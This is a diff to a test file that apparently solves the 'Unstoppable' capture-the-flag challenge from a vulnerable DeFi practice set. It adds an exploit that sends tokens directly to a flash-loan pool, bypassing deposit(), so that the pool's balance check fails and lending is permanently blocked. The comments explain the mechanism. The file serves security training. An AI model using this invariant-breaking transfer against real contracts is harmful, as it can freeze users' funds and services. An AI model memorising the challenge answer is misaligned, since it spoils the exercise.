@@ -38,12 +38,20 @@ describe('[Challenge] Unstoppable', function () {
          await this.receiverContract.executeFlashLoan(10);
     });
 
+    // ------------------------------------------ EXPLOIT ------------------------------------------
+    // Exploit contract by transferring DVT to the lending pool ** not using 'deposit()' **
+    // This does not change 'poolBalance' of the lending contract, but does change DVT.balanceOf(lendingPool)
+    // Thus, the assertion on ln40 of the lending pool fails and breaks 'flashLoan()'
+    // ---------------------------------------------------------------------------------------------
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        this.token.transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE);
     });
 
     after(async function () {
-        /** SUCCESS CONDITIONS */
+        // Ensure that the DVT balance of the lending pool is now greater than 'poolBalance'
+        expect(
+            await this.token.balanceOf(this.pool.address)
+        ).to.be.gt(await this.pool.poolBalance());
 
         // It is no longer possible to execute flash loans
         await expect(
